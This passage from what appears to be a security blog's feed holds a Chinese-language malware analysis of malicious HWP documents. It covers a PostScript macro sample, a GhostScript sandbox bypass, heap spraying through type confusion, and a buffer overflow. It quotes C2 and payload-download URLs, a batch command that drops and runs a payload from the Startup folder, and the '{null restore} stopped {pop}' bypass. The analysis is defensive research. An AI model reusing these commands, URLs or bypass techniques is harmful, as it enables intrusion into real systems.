      &lt;h1 id=&quot;背景与前言&quot;&gt;&lt;a href=&quot;#背景与前言&quot; class=&quot;headerlink&quot; title=&quot;背景与前言&quot;&gt;&lt;/a&gt;背景与前言&lt;/h1&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;根据360和微步在线公众号披露的情报称，从今年(2020年)11月份起，SideWinder开始策划针对中国的定向攻击。正如360威胁情报中心公众号所说，本次攻击是SideWinder利用邮件等方式传播带有远程模板的恶意文档发动的一次攻击，具体过程如下，首先利用远程模板注入从远程C2服务器上加载含有CVE-2017-11882漏洞的文档，之后执行恶意payload，加载释放在%temp%中的恶意js文件，该js脚本采用内存反射加载的方式执行C#文件，进而部署恶意后门程序。&lt;br&gt;
    
    </summary>
    
      <category term="windows安全" scheme="https://findream.github.io/categories/windows%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Hwp_文本类型样本分析总结</title>
    <link href="https://findream.github.io/2019/07/18/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF_24_Hwp%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/"/>
    <id>https://findream.github.io/2019/07/18/病毒分析技术_24_Hwp样本分析总结/</id>
    <published>2019-07-18T07:02:11.000Z</published>
    <updated>2021-03-27T08:07:52.136Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;前言略过，日后补齐~~<br><a id="more"></a></p><h1 id="0x1-什么是HWP"><a href="#0x1-什么是HWP" class="headerlink" title="0x1 什么是HWP"></a>0x1 什么是HWP</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;HWP全称是Hangul Word Processor，意为Hangul文字处理软件。主要为韩国国内提供服务。韩国国内市场占有率为75%以上。功能类似于国内的WPS或者微软的office组件。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;参考自：<a href="https://ti.360.net/blog/articles/analysis-of-group123-sample-with-hwp-exploitkit/" target="_blank" rel="external">https://ti.360.net/blog/articles/analysis-of-group123-sample-with-hwp-exploitkit/</a></p><h1 id="0x2-Hwp样本概述与分析思路"><a href="#0x2-Hwp样本概述与分析思路" class="headerlink" title="0x2 Hwp样本概述与分析思路"></a>0x2 Hwp样本概述与分析思路</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Hwp和office一样，有至少两种攻击手段。一种是类似于(就是)宏样本，与office不同的是，office使用的是vb的脚本语言，而Hwp使用的是称为PostScript的脚本语言。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PostScript（PS）是主要用于电子产业和桌面出版领域的一种页面描述语言和编程语言。PostScript是一种基于堆栈的解释语言（例如stack language），它类似于Forth语言但是使用从Lisp语言派生出的数据结构。这种语言的语法使用<strong>逆波兰表示法</strong>，这就意味着不需要括号进行分割，但是因为需要记住堆栈结构，<strong>所以需要进行训练才能阅读这种程序。</strong></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第二种就是利用hwp本身的漏洞，使用包括但不限于溢出，类型混淆之类的漏洞，改变程序的执行流，进而实施攻击。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据上述所说，针对Hwp样本分析思路就是：首先使用hwpscan查看一下hwp文件基本结构，重点是是否存在ps文件。这样就排除他不是宏样本。接着查看目录是否存在esp文件，如果有就有很大概率说明是利用了某个esp漏洞。排除上述两种之后，如果文档打开会奔溃，那么就可能存在其他漏洞。可以使用vt去搜索一下。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;参考自：<a href="https://zh.wikipedia.org/wiki/PostScript" title="PostScript描述" target="_blank" rel="external">https://zh.wikipedia.org/wiki/PostScript</a></p><h1 id="0x3-宏类型样本"><a href="#0x3-宏类型样本" class="headerlink" title="0x3 宏类型样本"></a>0x3 宏类型样本</h1><ul><li>IoC:106f24660aa878c6aaa5f30422d1916b</li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先使用HwpScan2工具打开样本文件。HwpScan2工具下载地址为<a href="https://www.nurilab.net/hwpscan2" target="_blank" rel="external">https://www.nurilab.net/hwpscan2</a>，可以看到存在一个BinData节。<br>    <img src="http://hacky.wang/blog/20190718/okBpHamjzgpb.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;将其Decompress转储出来，可以看到，根据PostScript语句如下代码是将Y101数组与<code>ED60732AA6FE818830ADCAE0C84717EE</code>这个key进行异或。解密得到下一层的混淆代码。<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">sub</span> </span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">/Y18 exch <span class="number">1</span> <span class="number">2</span> <span class="keyword">and</span> <span class="keyword">pop</span> def</div><div class="line">Y101 dup Y18 </div><div class="line">get &lt;ED60732AA6FE818830ADCAE0C84717EE&gt; </div><div class="line">Y18 <span class="number">15</span> <span class="keyword">and</span> /Y104 <span class="number">8</span> def get <span class="keyword">xor</span> Y18 exch put</div><div class="line">&#125; <span class="keyword">for</span> Y101 cvx <span class="keyword">exec</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如下图<br>    <img src="http://hacky.wang/blog/20190718/aWbpjaIoJCpQ.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190718/u8cyRDTbOXIF.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;得到新的加密ps代码。通读代码发现大致逻辑是将数组/Y77与Y17 Y99 16#24相加如下代码：<br>   <code>Y77 length Y17 Y99 16#24 add</code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;此时有两个思路，第一个，按照逻辑利用源码进行解密。第二个对PostScript解析器进行调试。这里使用第二种。使用调试的方法由有两种方法，第一，利用OD直接打开gbb.exe(在Hwp安装路径之下)，在参数传入第一层解密好的文件。如下图1为此方法。<br>    <img src="http://hacky.wang/blog/20190718/r6CVmJ9r8EeM.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第二种方法是，利用进程镜像劫持，启动调试器，然后开始调试，这是调试漏洞的常见方法。<br>    <img src="http://hacky.wang/blog/20190718/rb8qYFJhKM6A.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;主要讲一下思路：通过观察，目标是解密Hex数据串。我们只需要知道解密的数据即可。首先对CreateFile下断，然后对ReadFile下断。查看Buffer。待读入Hex之后下内存断点(不知道硬件断点为何失败)。然后F9，慢慢跟待到对Hex解密即可。<br>    <img src="http://hacky.wang/blog/20190718/33EnUteq3PJo.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190718/yErIDoMzlvPb.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;总结一下，组织利用Hwp文档进行恶意代码投递。使用到的样本(本样本)利用Hwp宏(没有漏洞)经过两次解密，得到一个具有联网功能的shellcode。然后通过访问<code>https://www.calderonflooring[.]com/wp-content/uploads/2018/webfont1.dat</code>和<code>https://www.calderonflooring[.]com/wp-content/uploads/2018/webfont2.dat</code>下载两个PE文件。</p><h2 id="PE分析"><a href="#PE分析" class="headerlink" title="PE分析"></a>PE分析</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;webfont1.dat和webfont2.dat实质上是两个PE文件，且两者是同一份源代码，但是webfont1.dat是X86,webfont2.dat是X64的。<br>    <img src="http://hacky.wang/blog/20190723/iqNNqHnTetHF.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;主要通过构造Http请求，使用Post方式，请求<code>https://www.mantoolmfg.com/wp-content/plugins/simple-sitemap/about.php</code>,<code>https://justintimecorp.com/wp-content/plugins/wordpress-seo/left.php</code>,<code>https://psalmsfm.org/wp-content/plugins/donate-plus/pay.php</code>url。然后通过WinHttpReceiveResponse等API接收和校验响应报文。使用WinHttpReadData并读取响应的数据<br>     <img src="http://hacky.wang/blog/20190723/F4MP53jc7ED2.png?imageslim" alt="mark"><br>     <img src="http://hacky.wang/blog/20190723/bXOVHqVen2rU.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过读取响应实现远控目的。命令为0x38CE55u时，为获取计算机盘符并发送。为0x21279Eu时，为从云端读取数据，并写入本地。当命令为0x2AFCB2u操作读取机器信息，并发送。当 Commond &gt; 0x48D6FC时。执行cmd.exe.<br>当Commond == 4773628。执行进程映射。<br>    <img src="http://hacky.wang/blog/20190723/EnqUOs4Oyx6V.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190723/30bUhBJFW6m0.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190723/SsigMfqwe4xl.png?imageslim" alt="mark"></p><ul><li>URL<ul><li><a href="https://www.mantoolmfg.com/wp-content/plugins/simple-sitemap/about.php" target="_blank" rel="external">https://www.mantoolmfg.com/wp-content/plugins/simple-sitemap/about.php</a></li><li><a href="https://justintimecorp.com/wp-content/plugins/wordpress-seo/left.php" target="_blank" rel="external">https://justintimecorp.com/wp-content/plugins/wordpress-seo/left.php</a></li><li><a href="https://psalmsfm.org/wp-content/plugins/donate-plus/pay.php" target="_blank" rel="external">https://psalmsfm.org/wp-content/plugins/donate-plus/pay.php</a></li></ul></li></ul><h1 id="0x4-GhostScript沙箱绕过漏洞"><a href="#0x4-GhostScript沙箱绕过漏洞" class="headerlink" title="0x4 GhostScript沙箱绕过漏洞"></a>0x4 GhostScript沙箱绕过漏洞</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先使用HwpScan2提取样本文件，发现存在eps文件，EPS是Encapsulated Post Script的缩写，是一个专用的打印机描述语言，可以描述矢量信息和位图信息，支持跨平台。<br>    <img src="http://hacky.wang/blog/20190719/X461TzKL5W6B.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过查看BIN0006.eps，可以发现样本进行如下操作：首先获取了appdata的路径，然后字符串凭借形成%appdata%\Microsoft\Windows\Start Menu\Programs\StartUp\UpgradeVer45.bat。将<code>copy /b &quot;%appdata%\\*.oju01&quot; &quot;%appdata%\\WinUpdate148399843.pif&quot; &amp; &quot;%appdata%\\WinUpdate148399843.pif&quot; &amp; del /f &quot;%appdata%\\WinUpdate148399843.pif</code>写入UpgradeVer45.bat。<br>     <img src="http://hacky.wang/blog/20190719/bzGRV72GBxlu.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着创建\Dhh01.oju01和\Dhh02.oju01，将MZ标志写入\Dhh01.oju01，然后循环读取closefile的Hex串。写入\Dhh02.oju01.<br>    <img src="http://hacky.wang/blog/20190719/1m5l7yv9f0ud.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这条语句<code>copy /b &quot;%appdata%\*.oju01&quot; &quot;%appdata%\WinUpdate148399843.pif&quot; &amp; &quot;%appdata%\WinUpdate148399843.pif&quot; &amp; del /f &quot;%appdata%\WinUpdate148399843.pif&quot;</code>作用是将两个文件拼接在一起。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;漏洞分析：通过上述分析，我们知道脚本功能是释放三个文件到启动目录，但是GhostScript提供了一个名为“-dSAFER”的参数来将EPS脚本的解析过程放到安全沙箱中执行，以防止诸如任意文件写这类高危操作发生。但是Hancom Office自带的使用GhostScript源代码开发出来的程序并没有使用这个参数。也就是说，Hancom Office自带的解释器没有安全沙箱这样的高危操作缓解的措施。也就间接的造成了沙箱绕过漏洞。<br>    <img src="http://hacky.wang/blog/20190719/uHUIOrxvkrOP.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们重新理一下Hwp漏洞触发的流程，首先，当我们使用Hancom Office打开恶意文档，自带的解释器会对参数进行适当的处理，然后跳转到gswin32.exe调用gsdll32.dll文件对ps脚本进行解析。当我们使用带有-dSAFER参数的命令，执行<code>gbb.exe -dSAFER BIN0006.eps</code>的时候，由于验证不合理，造成了漏洞利用，但是我们使用同目录下gswin32.exe并且带上-dSAFER参数参数，可以发现没有创建文件。<br>    <img src="http://hacky.wang/blog/20190719/HR93uvLUshMM.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;值得注意的是restore也会造成-dSAFER选项失效。使用<code>{null restore} stopped {pop}</code>即可绕过沙箱。原理如下：PostScript是一种“逆波兰式”（Reverse Polish Notation，也称为后缀表达式）的语言。简单来说就是操作数在前，操作符在后。PoC中这条语句是一条典型的PostScript异常处理语句，stopped操作符用于PostScript的异常处理，也就是说stopped执行前面{}中给出的过程，如果解释器在执行该过程期间出现错误，它将终止该过程并执行stopped操作符之后{}中的过程。null restore会引起类型检查错误（/typecheck error），同时restore的执行将LockSafetyParams设置为False，stopped捕获到异常，弹出栈顶元素null，GS继续运行，但此时LockSafetyParams的值还没恢复为True。</p><ul><li>参考自：<ul><li><a href="https://ti.360.net/blog/articles/analysis-of-group123-sample-with-hwp-exploitkit/" target="_blank" rel="external">https://ti.360.net/blog/articles/analysis-of-group123-sample-with-hwp-exploitkit/</a></li><li><a href="https://www.freebuf.com/column/182083.html" target="_blank" rel="external">https://www.freebuf.com/column/182083.html</a></li></ul></li><li>IoC:3f92afe96b4cfd41f512166c691197b5</li></ul><h1 id="0x5-类型混淆"><a href="#0x5-类型混淆" class="headerlink" title="0x5 类型混淆"></a>0x5 类型混淆</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先利用HpwScan2查看文件结构，可以发现一共有7个Section流在BodyText中。在2-6号Section中发现大量的雪橇指令，预估存在堆喷射。并且在雪橇指令的终点处发现标志<code>wvrsu</code>。之后预估为shellcode<br>    <img src="http://hacky.wang/blog/20190722/3V4g9sWCdyeR.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后开启页堆<code>gflag.exe /I Hwp.exe +hpa</code>。并在程序Hwp.exe启动的时候通过映像劫持挂上windbg。跑起来后，中断在08f9028a出现访问异常，定位于 [edx+54h] 处。这是因为开启了页堆造成的。<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">First chance exceptions are reported before any exception handling.</div><div class="line">This exception may be expected <span class="keyword">and</span> handled.</div><div class="line"><span class="attribute">eax</span>=c0000000 <span class="attribute">ebx</span>=123f8600 <span class="attribute">ecx</span>=0e0c0e0c <span class="attribute">edx</span>=00000000 <span class="attribute">esi</span>=0012ecc4 <span class="attribute">edi</span>=00000000</div><div class="line"><span class="attribute">eip</span>=08f9028a <span class="attribute">esp</span>=0012ec6c <span class="attribute">ebp</span>=122faf80 <span class="attribute">iopl</span>=0         nv up ei pl nz na pe nc</div><div class="line"><span class="attribute">cs</span>=001b  <span class="attribute">ss</span>=0023  <span class="attribute">ds</span>=0023  <span class="attribute">es</span>=0023  <span class="attribute">fs</span>=003b  <span class="attribute">gs</span>=0000             <span class="attribute">efl</span>=00010206</div><div class="line">*** ERROR: Symbol file could <span class="keyword">not</span> be found.  Defaulted <span class="keyword">to</span> <span class="builtin-name">export</span> symbols <span class="keyword">for</span> C:\Program Files\Hnc\Hwp80\HwpApp.dll - </div><div class="line">HwpApp+0x4028a:</div><div class="line">08f9028a 8b4254          mov     eax,dword ptr [edx+54h] ds:0023:<span class="attribute">00000054</span>=????????</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着查看反汇编代码,看到将[edx+54h]这个未初始化的值赋给eax，然后调用了eax。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt; u</div><div class="line">HwpApp+<span class="number">0x4028a</span>:</div><div class="line">08f9028a 8b4254          <span class="keyword">mov</span>     <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">edx</span>+<span class="number">54h</span>]</div><div class="line">08f9028d 896c241c        <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esp</span>+<span class="number">1Ch</span>],<span class="built_in">ebp</span></div><div class="line">08f90291 ffd0            <span class="keyword">call</span>    <span class="built_in">eax</span></div><div class="line">08f90293 8bd8            <span class="keyword">mov</span>     <span class="built_in">ebx</span>,<span class="built_in">eax</span></div><div class="line">08f90295 8d7c241c        <span class="keyword">lea</span>     <span class="built_in">edi</span>,[<span class="built_in">esp</span>+<span class="number">1Ch</span>]</div><div class="line">08f90299 e8d2faffff      <span class="keyword">call</span>    HwpApp+<span class="number">0x3fd70</span> (08f8fd70)</div><div class="line">08f9029e 85c0            <span class="keyword">test</span>    <span class="built_in">eax</span>,<span class="built_in">eax</span></div><div class="line">08f902a0 747f            <span class="keyword">je</span>      HwpApp+<span class="number">0x40321</span> (08f90321)</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后关闭页堆，同时对发生崩溃的call eax下断。<br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt; ? <span class="number">08</span>f90291-hwpapp</div><div class="line"><span class="symbol">Evaluate</span> expression: <span class="number">262801</span> = <span class="number">00040291</span></div><div class="line">//</div><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="keyword">bp </span>hwpapp+<span class="number">40291</span></div><div class="line"><span class="keyword">Bp </span>expression <span class="string">'hwpapp+40291'</span> could not <span class="keyword">be </span>resolved, <span class="keyword">adding </span>deferred <span class="keyword">bp</span></div><div class="line"><span class="keyword">0:000&gt; </span><span class="keyword">bl</span></div><div class="line"><span class="keyword"> </span><span class="number">0</span> eu             <span class="number">0001</span> (<span class="number">0001</span>) (hwppp+<span class="number">40291</span>)</div><div class="line"> <span class="number">1</span> eu             <span class="number">0001</span> (<span class="number">0001</span>) (hwpapp+<span class="number">40291</span>)</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;触发漏洞使得EIP转移到 call    eax {0e0c0e0c}，t跟入。发现是一些雪橇指令，雪橇指令(或者堆喷射原理)见：<a href="https://blog.csdn.net/magictong/article/details/7391397" target="_blank" rel="external">https://blog.csdn.net/magictong/article/details/7391397</a>。找到了这些雪橇指令就相当于定位到shellcode。<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">ModLoad: 08e20000 08e27000   C:\Program Files\Hnc\Hwp80\DocFiltersRes.KOR</div><div class="line">Breakpoint 1 hit</div><div class="line"><span class="attribute">eax</span>=0e0c0e0c <span class="attribute">ebx</span>=072d0000 <span class="attribute">ecx</span>=0e0c0e0c <span class="attribute">edx</span>=0e0c0e0c <span class="attribute">esi</span>=0012ecc4 <span class="attribute">edi</span>=00000000</div><div class="line"><span class="attribute">eip</span>=04e00291 <span class="attribute">esp</span>=0012ec6c <span class="attribute">ebp</span>=08f98090 <span class="attribute">iopl</span>=0         nv up ei pl nz na pe nc</div><div class="line"><span class="attribute">cs</span>=001b  <span class="attribute">ss</span>=0023  <span class="attribute">ds</span>=0023  <span class="attribute">es</span>=0023  <span class="attribute">fs</span>=003b  <span class="attribute">gs</span>=0000             <span class="attribute">efl</span>=00000206</div><div class="line">HwpApp+0x40291:</div><div class="line">04e00291 ffd0            call    eax &#123;0e0c0e0c&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据之前，通过HpwScan2分析得到shellcode的标志<code>wvrsu</code>，通过搜索内存区域<code>s -d 0x3 l?0x7fffffff 0x53525657</code>，得到如下含有<code>wvrsu</code>的堆区。结合雪橇指令滑入的地址eip=0e0c0e0c，定位到0x0ecbfc5b.<code>bp 0x0ecbfc5b</code><br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">0:000&gt; s -d 0x3 l?0x7fffffff 0x53525657</div><div class="line">073e82bb  53525657 c9335155 0c0e0cba 028a420e  WVRSUQ3<span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>B<span class="built_in">..</span></div><div class="line">073fc573  53525657 c9335155 0c0e0cba 028a420e  WVRSUQ3<span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>B<span class="built_in">..</span></div><div class="line">0b68fc5b  53525657 c9335155 0c0e0cba 028a420e  WVRSUQ3<span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>B<span class="built_in">..</span></div><div class="line">0c89fc5b  53525657 c9335155 0c0e0cba 028a420e  WVRSUQ3<span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>B<span class="built_in">..</span></div><div class="line">0daafc5b  53525657 c9335155 0c0e0cba 028a420e  WVRSUQ3<span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>B<span class="built_in">..</span></div><div class="line">0ecbfc5b  53525657 c9335155 0c0e0cba 028a420e  WVRSUQ3<span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>B<span class="built_in">..</span></div><div class="line">0fecfc5b  53525657 c9335155 0c0e0cba 028a420e  WVRSUQ3<span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>B<span class="built_in">..</span></div><div class="line">1123fc5b  53525657 c9335155 0c0e0cba 028a420e  WVRSUQ3<span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>B<span class="built_in">..</span></div><div class="line">133afc5b  53525657 c9335155 0c0e0cba 028a420e  WVRSUQ3<span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>B<span class="built_in">..</span></div><div class="line">145bfc5b  53525657 c9335155 0c0e0cba 028a420e  WVRSUQ3<span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>B<span class="built_in">..</span></div><div class="line">157cfc5b  53525657 c9335155 0c0e0cba 028a420e  WVRSUQ3<span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>B<span class="built_in">..</span></div><div class="line">169dfc5b  53525657 c9335155 0c0e0cba 028a420e  WVRSUQ3<span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>B<span class="built_in">..</span></div><div class="line">0:000&gt; r eip</div><div class="line"><span class="attribute">eip</span>=0e0c0e0c</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>bp 0x0ecbfc5b</code>，g到0x0ecbfc5b，可以看到shellcode首先通过cpuid指令，通过去ecx第31位的值是否等于1判断样本是否处于虚拟机中运行。<br>    <img src="http://hacky.wang/blog/20190722/S03tYkkyMl97.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190722/jOtP1n0hQRV6.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在跟0x0eccfca2，<code>r ecx = 0</code>将ecx置0。跟到0x0eccfd21处，发现jmp eax调用了LoadLibraryEx。<code>bp 0x0eccfd21</code>下断。shellcode总计调用了<code>LoadLibraryEx</code>,<code>GlobalAlloc</code>,<code>CreateFileW</code>,<code>GetFileSize</code>,<code>SetFilePointer</code>,<code>ReadFile</code>,<code>CreateProcessA</code>,<code>VirtualAllocEx</code>,<code>WriteProcessMemory</code>,<code>CreateRemoteThread</code>。可以明确知道shellcode使用WriteProcessMemory将第二段shellcode写入notepad中，然后执行新的shellcode。<br>    <img src="http://hacky.wang/blog/20190722/yBRMs9OiWz55.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190722/z6GMpcUWv4rT.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190722/9SVICvzsq8Ut.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190722/LmmbJ6uB34dO.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190722/O8i4weQPuuCn.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190722/GT6MjLQK2VSb.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第二层shellcode首先在%temp下释放了wsss.dll文件，然后调用了wsss.dll文件。<br>    <img src="http://hacky.wang/blog/20190722/HFqLvWzVooUu.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190722/d31OWJJ0qB0W.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190723/F6RGpo5Xvx1u.png?imageslim" alt="mark"></p><ul><li>IoC:33874577bf54d3c209925c9def880eb9</li></ul><h1 id="0x6-缓冲区溢出"><a href="#0x6-缓冲区溢出" class="headerlink" title="0x6 缓冲区溢出"></a>0x6 缓冲区溢出</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第四种是缓冲区溢出漏洞，Hwp2.0 偏移 0x48E 的位置开始是字体结构,前两个字节是字体名称数量,每个字体名称长度为 0x28。在程序读取Hwp2.0的文档的时候，首先使用ConvertFilterFileToWorkFile将文档转化为Hwp3.0，然后调用Set20FontList 子函数处理字体结构。但是在进行复制字体名称的时候，需要将arySrc[0x28]的数据复制到aryDest[0x28]，但是本应在arySrc[0x28]中最后一个字符为’\0’，但是此处为3C。造成了缓冲区异常，从而触发内存访问异常。<br>    <img src="http://hacky.wang/blog/20190726/qRnqOF0CtsIl.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当触发异常1后，然后进入SEH处理流程，调用SEH Handler。然后通过pop-ret指令跳转到shellcode</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;没有复现成功，参考自：<a href="https://wooyun.js.org/drops/APT%20洋葱狗行动(Operation%20OnionDog" target="_blank" rel="external">https://wooyun.js.org/drops/APT%20洋葱狗行动(Operation%20OnionDog)分析报告.html</a>分析报告.html)</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x0-前言&quot;&gt;&lt;a href=&quot;#0x0-前言&quot; class=&quot;headerlink&quot; title=&quot;0x0 前言&quot;&gt;&lt;/a&gt;0x0 前言&lt;/h1&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;前言略过，日后补齐~~&lt;br&gt;
    
    </summary>
    
      <category term="windows安全" scheme="https://findream.github.io/categories/windows%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>linux下样本分析小结</title>
